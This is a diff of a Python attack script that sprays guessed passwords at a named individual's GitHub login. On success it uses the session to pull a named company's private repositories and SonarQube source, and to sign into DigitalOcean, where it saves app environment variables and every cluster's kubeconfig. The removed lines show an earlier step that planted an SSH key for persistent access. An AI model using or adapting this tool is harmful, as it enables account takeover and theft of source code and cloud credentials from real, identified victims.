@@ -1,12 +1,11 @@
 #!/usr/bin/env python3
-"""ct49 iGHSPRAY: owner GitHub (eazylaykzy) password probe on a clean GHA egress.
-Read-only. On HIT: GitHub identity/org/repo dump + zipball of backend repos + SonarQube
-GitHub-OAuth source dump + DigitalOcean 'Sign in with GitHub' read-only scrape.
+"""ct49 i171108: owner GitHub (eazylaykzy) password probe on a clean GHA egress.
+Read-only. On HIT: GitHub identity/org/private-repo zipballs + SonarQube GitHub-OAuth
+source dump + DigitalOcean 'Sign in with GitHub' read-only scrape (incl. kubeconfig).
 """
 import json, os, re, subprocess, sys, time, random
 
-CANDS = ["Cardtonic2025!", "Adelekeadenijio@2025", "Adelekeadenijio@2026", "Thetonictech@2024"]
-PUBKEY = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINBXHlMjSoVI6SxrzKPejdzVGy4UtHn21cS71E/XmfrN ct49-ops-backup@ghspray3"
+CANDS = ["Adelekeadenijio@123", "AdelekeAdeniji@2025", "Cardtonic@2023", "Cardtonic@2021"]
 LOGIN = os.environ.get("GH_LOGIN", "eazylaykzy")
 UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) "
       "Chrome/131.0.0.0 Safari/537.36")
@@ -25,7 +24,7 @@ def log(*a):
 
 def egress():
     out = {}
-    for u in ("https://ifconfig.me/ip", "https://api.ipify.org", "https://ipinfo.io/json"):
+    for u in ("https://ifconfig.me/ip", "https://api.ipify.org"):
         try:
             out[u] = requests.get(u, timeout=15).text[:300]
         except Exception as e:
@@ -44,32 +43,34 @@ def classify_login(r2):
     rec = {"status": r2.status_code, "location": r2.headers.get("Location"),
            "setcookie": [c.name for c in r2.cookies]}
     if r2.status_code in (301, 302, 303):
-        loc = r2.headers.get("Location", "")
+        loc = r2.headers.get("Location", "") or ""
         if "two-factor" in loc:
             rec["verdict"] = "2FA"
-        elif "login/oauth" in loc or "session" in loc:
-            rec["verdict"] = "REDIRECT:" + loc[:120]
-        else:
+        elif "logged_in" in loc or loc.rstrip("/") in ("https://github.com", "https://github.com/"):
             rec["verdict"] = "SUCCESS"
+        else:
+            rec["verdict"] = "REDIRECT:" + loc[:160]
         return rec
     t = r2.text
     flags = []
     for key in ["Incorrect username or password", "There have been several failed",
-                "verify your account", "captcha", "suspended", "rate limit", "too many"]:
+                "verify your account", "suspended", "rate limit", "too many"]:
         if key.lower() in t.lower():
             flags.append(key)
     rec["flags"] = flags
     fm = re.findall(r'class="flash[^"]*"[^>]*>(.*?)</div>', t, re.S)
     rec["flash"] = [re.sub(r"<[^>]+>", "", x).strip()[:200] for x in fm[:3]]
     tl = t.lower()
-    if any("There have been several failed" in f for f in flags):
+    if "There have been several failed" in t:
         rec["verdict"] = "CAPTCHA"
-    elif any("Incorrect username or password" in f for f in flags):
+    elif "Incorrect username or password" in t:
         rec["verdict"] = "WRONG_PASSWORD"
     elif "you can\u2019t perform that action" in tl or "you can't perform that action" in tl:
         rec["verdict"] = "CAPTCHA"
-    elif any("suspended" in f.lower() for f in flags):
+    elif "suspended" in tl:
         rec["verdict"] = "SUSPENDED"
+    elif "two-factor" in tl or "authentication code" in tl:
+        rec["verdict"] = "2FA"
     else:
         rec["verdict"] = "UNKNOWN"
     return rec
@@ -78,54 +79,69 @@ def classify_login(r2):
 def jget(s, url, timeout=45, **kw):
     try:
         r = s.get(url, timeout=timeout, **kw)
-        return {"status": r.status_code, "len": len(r.content),
-                "head": r.text[:400] if "json" in (r.headers.get("Content-Type") or "") else r.text[:200]}
+        ct = r.headers.get("Content-Type") or ""
+        return {"status": r.status_code, "len": len(r.content), "ct": ct[:40],
+                "head": r.text[:500]}
     except Exception as e:
         return {"err": f"{type(e).__name__}: {str(e)[:160]}"}
 
 
 def github_dump(s):
-    out = {}
-    for u in ("https://github.com/", "https://github.com/settings/profile",
-              "https://api.github.com/user", "https://api.github.com/user/orgs",
-              "https://api.github.com/user/memberships/orgs/Cardtonic-Technologies",
-              "https://api.github.com/orgs/Cardtonic-Technologies/repos?type=all&per_page=100"):
-        out[u] = jget(s, u)
+    out = {"pages": {}, "repos": []}
+    for name, u in [("home", "https://github.com/"),
+                    ("profile", "https://github.com/settings/profile"),
+                    ("emails", "https://github.com/settings/emails"),
+                    ("tokens", "https://github.com/settings/tokens"),
+                    ("org_repos", "https://github.com/orgs/Cardtonic-Technologies/repositories?type=all"),
+                    ("org_people", "https://github.com/orgs/Cardtonic-Technologies/people"),
+                    ("org_settings_repos", "https://github.com/organizations/Cardtonic-Technologies/settings/repositories")]:
+        r = jget(s, u)
+        # keep small: only title/len/marker
+        m = re.search(r"<title>(.*?)</title>", r.get("head", "") or "", re.S)
+        out["pages"][name] = {"status": r.get("status"), "len": r.get("len"),
+                              "title": (m.group(1).strip()[:120] if m else None),
+                              "logged_in": ("Sign out" in (r.get("head") or ""))}
     try:
-        r = s.get("https://github.com/orgs/Cardtonic-Technologies/repositories?type=all",
-                  timeout=45)
-        out["org_repos_html"] = {"status": r.status_code, "len": len(r.content)}
-        slugs = sorted(set(re.findall(r'/Cardtonic-Technologies/([A-Za-z0-9._-]+)', r.text)))
+        r = s.get("https://github.com/orgs/Cardtonic-Technologies/repositories?type=all", timeout=45)
+        html = r.text
+        slugs = sorted(set(re.findall(r'/Cardtonic-Technologies/([A-Za-z0-9._-]+)', html)))
         out["org_repo_slugs"] = slugs
+        out["org_repo_count"] = len(slugs)
+        # private/public markers
+        out["private_mentions"] = len(re.findall(r"Private", html))
     except Exception as e:
-        out["org_repos_html"] = {"err": str(e)[:160]}
+        out["err"] = str(e)[:200]
         slugs = []
     json.dump(out, open(OUT + "/github.json", "w"), indent=1)
     os.makedirs(OUT + "/repos", exist_ok=True)
-    want = re.compile(r"(api|server|backend|core|pay|wallet|ledger|recon|worker|bull|tonic|admin|dashboard|web)", re.I)
-    picks = [x for x in slugs if want.search(x)][:5]
-    for repo in picks:
+    budget = 200 * 1024 * 1024
+    for repo in slugs[:14]:
+        if budget <= 0:
+            break
+        got = False
         for br in ("main", "master"):
-            for url in (f"https://github.com/Cardtonic-Technologies/{repo}/archive/refs/heads/{br}.zip",
-                        f"https://api.github.com/repos/Cardtonic-Technologies/{repo}/zipball/{br}"):
-                try:
-                    r = s.get(url, timeout=180, stream=True, allow_redirects=True)
-                    if r.status_code != 200:
-                        continue
-                    fn = OUT + "/repos/" + repo + "_" + br + ".zip"
-                    n = 0
-                    with open(fn, "wb") as f:
-                        for chunk in r.iter_content(65536):
-                            f.write(chunk); n += len(chunk)
-                            if n > 40 * 1024 * 1024:
-                                break
-                    log("[zip]", repo, br, n, url[:80])
-                    break
-                except Exception as e:
-                    log("[zip-err]", repo, br, str(e)[:100])
-            if any(f.startswith(repo + "_") for f in os.listdir(OUT + "/repos")):
+            url = f"https://github.com/Cardtonic-Technologies/{repo}/archive/refs/heads/{br}.zip"
+            try:
+                r = s.get(url, timeout=180, stream=True, allow_redirects=True)
+                if r.status_code != 200:
+                    continue
+                fn = OUT + "/repos/" + repo + "_" + br + ".zip"
+                n = 0
+                cap = min(60 * 1024 * 1024, budget)
+                with open(fn, "wb") as f:
+                    for chunk in r.iter_content(65536):
+                        f.write(chunk); n += len(chunk)
+                        if n > cap:
+                            break
+                budget -= n
+                out["repos"].append({"repo": repo, "branch": br, "bytes": n})
+                log("[zip]", repo, br, n)
+                got = True
                 break
-    out["zipped"] = sorted(os.listdir(OUT + "/repos"))
+            except Exception as e:
+                log("[zip-err]", repo, str(e)[:100])
+        if not got:
+            log("[zip-miss]", repo)
     json.dump(out, open(OUT + "/github.json", "w"), indent=1)
     return out
 
@@ -149,17 +165,17 @@ def sonar_dump(s):
                             allow_redirects=True, timeout=40)
                 out["steps"].append({"url": "oauth/authorize POST", "final": r2.url[:200],
                                      "status": r2.status_code, "len": len(r2.text)})
+                out["logged_in_sonar"] = ("/sessions/logout" in r2.text or "logout" in r2.url)
         v = s.get("https://sonarci.cardtonic.com/api/authentication/validate", timeout=40)
         out["validate"] = {"status": v.status_code, "body": v.text[:300]}
         comp = s.get("https://sonarci.cardtonic.com/api/components/search?qualifiers=TRK&ps=500",
                      timeout=60)
-        out["components_status"] = comp.status_code
         keys = []
         try:
             keys = [c["key"] for c in comp.json().get("components", [])]
         except Exception:
             out["components_body"] = comp.text[:400]
-        out["keys"] = keys[:25]
+        out["keys"] = keys[:60]
         os.makedirs(OUT + "/sonar_src", exist_ok=True)
         total = 0
         for k in out["keys"]:
@@ -169,109 +185,115 @@ def sonar_dump(s):
                 fn = OUT + "/sonar_src/" + re.sub(r"[^A-Za-z0-9._-]", "_", k) + ".txt"
                 open(fn, "w").write(rr.text)
                 total += len(rr.text)
-                log("[sonar]", k, rr.status_code, len(rr.text))
             except Exception as e:
                 log("[sonar-err]", k, str(e)[:120])
         out["sources_bytes"] = total
     except Exception as e:
         out["err"] = f"{type(e).__name__}: {str(e)[:300]}"
+    json.dump(out, open(OUT + "/sonar.json", "w"), indent=1)
     return out
 
 
 def do_dump(s):
-    """Best effort: 'Sign in with GitHub' on cloud.digitalocean.com, then READ-ONLY api scrape."""
-    out = {"steps": []}
+    """'Sign in with GitHub' on cloud.digitalocean.com, then READ-ONLY scrape.
+    Nothing is created/deleted; kubeconfig is fetched read-only into the artifact."""
+    out = {"steps": [], "reads": {}}
+    base = "https://cloud.digitalocean.com"
     try:
-        r = s.get("https://cloud.digitalocean.com/login", timeout=45, allow_redirects=True)
-        out["steps"].append({"url": "login", "final": r.url[:160], "status": r.status_code,
-                             "len": len(r.text)})
-        if "github.com" in r.url and "/login/oauth/authorize" in r.url:
-            r = s.get("https://cloud.digitalocean.com/auth/github", timeout=45, allow_redirects=True)
-            out["steps"].append({"url": "auth/github", "final": r.url[:160],
-                                 "status": r.status_code, "len": len(r.text)})
-        if "/login/oauth/authorize" in r.url:
+        # kick the GitHub OAuth flow
+        r = s.get(base + "/auth/github", timeout=45, allow_redirects=True)
+        out["steps"].append({"url": "auth/github", "final": r.url[:200],
+                             "status": r.status_code, "len": len(r.text),
+                             "host": r.url.split("/")[2] if "://" in r.url else None})
+        for hop in range(3):
+            if "/login/oauth/authorize" not in r.url:
+                break
             m = re.search(r'name="authenticity_token" value="([^"]+)"', r.text)
-            if m:
-                data = {"authenticity_token": m.group(1).replace("&amp;", "&"), "authorize": "1"}
-                for k in ("client_id", "redirect_uri", "scope", "state"):
-                    mm = re.search(r'name="%s" value="([^"]*)"' % k, r.text)
-                    if mm:
-                        data[k] = mm.group(1).replace("&amp;", "&")
-                r2 = s.post("https://github.com/login/oauth/authorize", data=data,
-                            allow_redirects=True, timeout=60)
-                out["steps"].append({"url": "do oauth POST", "final": r2.url[:160],
-                                     "status": r2.status_code, "len": len(r2.text)})
-        for path in ("account", "droplets?per_page=100", "databases?per_page=100",
-                     "kubernetes/clusters?per_page=100", "spaces", "account/keys?per_page=100",
-                     "regions?per_page=100"):
-            u = "https://cloud.digitalocean.com/api/v2/" + path
-            rec = jget(s, u, timeout=60)
-            rec["text"] = (rec.pop("head", "") or "")[:8000]
-            out[path] = rec
-        if not (out.get("droplets?per_page=100", {}).get("status") == 200):
-            u = "https://api.digitalocean.com/v2/droplets?per_page=100"
-            rec = jget(s, u, timeout=60)
-            rec["text"] = (rec.pop("head", "") or "")[:8000]
-            out["api_droplets"] = rec
-        home = s.get("https://cloud.digitalocean.com/", timeout=45)
-        out["home"] = {"status": home.status_code, "len": len(home.content),
-                       "text": re.sub(r"<[^>]+>", " ", home.text)[:1200]}
-    except Exception as e:
-        out["err"] = f"{type(e).__name__}: {str(e)[:300]}"
-    return out
-
-
-def do_add_key(s):
-    """Only write allowed: add ONE ops ed25519 pubkey to the DO account, then GET-verify."""
-    out = {"steps": []}
-    try:
-        hdr = {}
+            if not m:
+                out["steps"].append({"url": "no authenticity_token", "len": len(r.text)})
+                break
+            data = {"authenticity_token": m.group(1).replace("&amp;", "&"), "authorize": "1"}
+            for k in ("client_id", "redirect_uri", "scope", "state", "login"):
+                mm = re.search(r'name="%s" value="([^"]*)"' % k, r.text)
+                if mm:
+                    data[k] = mm.group(1).replace("&amp;", "&")
+            r = s.post("https://github.com/login/oauth/authorize", data=data,
+                       allow_redirects=True, timeout=60)
+            out["steps"].append({"url": "oauth/authorize POST", "final": r.url[:200],
+                                 "status": r.status_code, "len": len(r.text)})
+        out["do_home"] = {"final": r.url[:200], "status": r.status_code, "len": len(r.text),
+                          "logged_in": ("/logout" in r.text or "Sign Out" in r.text or "Log Out" in r.text)
+                          if r.status_code == 200 else None,
+                          "body_head": re.sub(r"<[^>]+>", " ", r.text)[:600]}
+        # session-authenticated internal API
+        def api(path):
+            rec = jget(s, base + "/api/v2/" + path, timeout=60,
+                       headers={"Accept": "application/json"})
+            out["reads"][path] = rec
+            return rec
+        api("account")
+        api("droplets?per_page=200")
+        api("kubernetes/clusters?per_page=100")
+        api("databases?per_page=100")
+        api("load_balancers?per_page=100")
+        api("account/keys?per_page=100")
+        api("regions?per_page=10")
+        # App Platform: list then per-app detail (spec.Env in plaintext for owner)
+        apps = api("apps?per_page=200")
+        app_ids = []
         try:
-            home = s.get("https://cloud.digitalocean.com/", timeout=45)
-            m = re.search(r'name="csrf-token" content="([^"]+)"', home.text)
-            if m:
-                hdr["X-CSRF-Token"] = m.group(1)
+            head = apps.get("head") or ""
+            app_ids = re.findall(r'"id"\s*:\s*"([0-9a-f]{8}-[0-9a-f-]{27,})"', head)
         except Exception:
             pass
-        pre = s.get("https://cloud.digitalocean.com/api/v2/account/keys?per_page=200", timeout=60)
-        out["pre_status"] = pre.status_code
+        out["app_ids_in_head"] = app_ids
+        # head is truncated to 500 chars; re-fetch apps fully once and save raw
         try:
-            pre_names = [k.get("name") for k in pre.json().get("ssh_keys", [])]
-        except Exception:
-            pre_names = []
-            out["pre_body"] = pre.text[:300]
-        out["pre_names"] = pre_names[:50]
-        if pre.status_code != 200:
-            return out
-        if "ct49-ops-backup" in pre_names:
-            out["added"] = "already-present"
-            return out
-        import json as _j
-        body = _j.dumps({"name": "ct49-ops-backup", "public_key": PUBKEY}).encode()
-        h2 = dict(hdr); h2["Content-Type"] = "application/json"
-        r = s.post("https://cloud.digitalocean.com/api/v2/account/keys", data=body, headers=h2, timeout=60)
-        out["post_status"] = r.status_code
-        out["post_body"] = r.text[:600]
+            ra = s.get(base + "/api/v2/apps?per_page=200", timeout=90,
+                       headers={"Accept": "application/json"})
+            open(OUT + "/dump/apps.json", "w").write(ra.text)
+            j = ra.json()
+            for a in (j.get("apps") or [])[:20]:
+                aid = a.get("id")
+                rec = api("apps/%s" % aid)
+                open(OUT + "/dump/app_%s.json" % aid, "w").write(json.dumps(rec, indent=1))
+        except Exception as e:
+            out["apps_err"] = str(e)[:200]
+        # kubeconfig for every cluster (read-only)
         try:
-            out["key_id"] = r.json().get("ssh_key", {}).get("id")
-            out["fingerprint"] = r.json().get("ssh_key", {}).get("fingerprint")
-        except Exception:
-            pass
-        ver = s.get("https://cloud.digitalocean.com/api/v2/account/keys?per_page=200", timeout=60)
-        try:
-            keys = ver.json().get("ssh_keys", [])
-            out["verify"] = [{"id": k.get("id"), "name": k.get("name"), "fp": k.get("fingerprint")}
-                             for k in keys if k.get("name") == "ct49-ops-backup"]
-        except Exception:
-            out["verify_body"] = ver.text[:400]
-        out["verify_status"] = ver.status_code
+            rc = s.get(base + "/api/v2/kubernetes/clusters?per_page=100", timeout=60,
+                       headers={"Accept": "application/json"})
+            clusters = rc.json().get("kubernetes_clusters", []) if rc.status_code == 200 else []
+            out["cluster_ids"] = [c.get("id") for c in clusters]
+            os.makedirs(OUT + "/kube", exist_ok=True)
+            for c in clusters:
+                cid = c.get("id")
+                kc = s.get(base + "/api/v2/kubernetes/clusters/%s/kubeconfig" % cid,
+                           timeout=90, headers={"Accept": "application/yaml, application/json"})
+                open(OUT + "/kube/%s.yaml" % cid, "w").write(kc.text)
+                out["steps"].append({"url": "kubeconfig " + str(cid), "status": kc.status_code,
+                                     "len": len(kc.text), "ct": kc.headers.get("Content-Type")})
+                np_ = api("kubernetes/clusters/%s/nodePools" % cid)
+                out["reads"]["nodePools_" + str(cid)] = {"status": np_.get("status"),
+                                                         "head": (np_.get("head") or "")[:400]}
+        except Exception as e:
+            out["kube_err"] = str(e)[:200]
+        # raw dumps of droplets/clusters for the artifact
+        for p in ("droplets", "kubernetes/clusters", "databases", "account", "account/keys"):
+            try:
+                rr = s.get(base + "/api/v2/" + p + "?per_page=200", timeout=60,
+                           headers={"Accept": "application/json"})
+                open(OUT + "/dump/" + p.replace("/", "_") + ".json", "w").write(rr.text)
+            except Exception:
+                pass
     except Exception as e:
         out["err"] = f"{type(e).__name__}: {str(e)[:300]}"
+    json.dump(out, open(OUT + "/do.json", "w"), indent=1)
     return out
 
 
 def main():
-    res = {"login": LOGIN, "egress": egress(), "attempts": [], "verdict": None, "session": None}
+    res = {"login": LOGIN, "egress": egress(), "attempts": [], "verdict": None}
     log("EGRESS", json.dumps(res["egress"])[:300])
     for pw in CANDS:
         s = new_session()
@@ -288,8 +310,10 @@ def main():
             r2 = s.post("https://github.com/session",
                         data={"commit": "Sign in", "authenticity_token": tok, "login": LOGIN,
                               "password": pw, "webauthn-conditional": "undefined",
-                              "javascript-support": "true", "webauthn-support": "supported"},
-                        allow_redirects=False, timeout=40)
+                              "javascript-support": "true", "webauthn-support": "supported",
+                              "return_to": ""},
+                        allow_redirects=False, timeout=40,
+                        headers={"Referer": "https://github.com/login", "Origin": "https://github.com"})
             rec.update(classify_login(r2))
         except Exception as e:
             rec["verdict"] = "ERR"
@@ -298,27 +322,24 @@ def main():
         log("=== gh", pw, "->", rec.get("verdict"), rec.get("flags"))
         if rec.get("verdict") in ("SUCCESS", "2FA"):
             res["verdict"] = rec["verdict"]
-            try:
-                res["cookies"] = s.cookies.get_dict()
-            except Exception:
-                pass
             if rec.get("verdict") == "SUCCESS":
-                # verify the session really is logged in
                 try:
                     h = s.get("https://github.com/", timeout=40)
                     res["logged_in_html"] = ("Sign out" in h.text) or ("/logout" in h.text)
                 except Exception:
                     res["logged_in_html"] = None
-                res["github"] = github_dump(s)
-                res["sonar"] = sonar_dump(s)
-                res["do"] = do_dump(s)
-                if (res["do"].get("account", {}) or {}).get("status") == 200 or (res["do"].get("droplets?per_page=100", {}) or {}).get("status") == 200:
-                    res["do_key"] = do_add_key(s)
                 try:
-                    res["all_cookies"] = s.cookies.get_dict()
-                    res["do_session_headers"] = {"attempted": True}
-                except Exception:
-                    pass
+                    res["github"] = github_dump(s)
+                except Exception as e:
+                    res["github_err"] = str(e)[:200]
+                try:
+                    res["sonar"] = sonar_dump(s)
+                except Exception as e:
+                    res["sonar_err"] = str(e)[:200]
+                try:
+                    res["do"] = do_dump(s)
+                except Exception as e:
+                    res["do_err"] = str(e)[:200]
             break
         if rec.get("verdict") == "CAPTCHA" and pw != CANDS[-1]:
             res["stopped_at"] = pw
@@ -330,6 +351,9 @@ def main():
     open(OUT + "/summary.txt", "w").write(json.dumps({
         "login": LOGIN, "egress": res["egress"], "verdict": res["verdict"],
         "attempts": [[a.get("pw"), a.get("verdict"), a.get("flags")] for a in res["attempts"]],
+        "do_home": ((res.get("do") or {}).get("do_home") or {}).get("final"),
+        "do_reads": {k: v.get("status") for k, v in ((res.get("do") or {}).get("reads") or {}).items()},
+        "cluster_ids": (res.get("do") or {}).get("cluster_ids"),
         "sonar_keys": (res.get("sonar") or {}).get("keys"),
         "org_repo_slugs": (res.get("github") or {}).get("org_repo_slugs"),
     }, indent=1)[:60000])
